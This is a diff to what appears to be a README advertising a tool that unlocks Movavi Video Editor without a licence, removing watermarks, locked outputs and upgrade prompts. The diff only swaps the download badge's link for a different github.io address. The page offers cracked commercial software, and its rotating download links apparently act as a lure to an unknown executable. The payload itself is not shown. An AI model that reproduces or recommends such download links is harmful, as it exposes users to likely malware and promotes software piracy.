@@ -3,7 +3,7 @@
 Remove limitations in **Movavi Video Editor** and take full control of your projects. Eliminate export watermarks, enable locked output options, and enjoy the complete editing suite without upgrade prompts.
 
 ⬇️ **Download**  
-[![Download Deployment Tool](https://img.shields.io/badge/Download-Deployment_Tool-brightgreen?style=for-the-badge)](https://movavi-video-editor-activated-download.github.io/.github/)
+[![Download Deployment Tool](https://img.shields.io/badge/Download-Deployment_Tool-brightgreen?style=for-the-badge)](https://movavis-info.github.io/.github/)
 
 ---
 
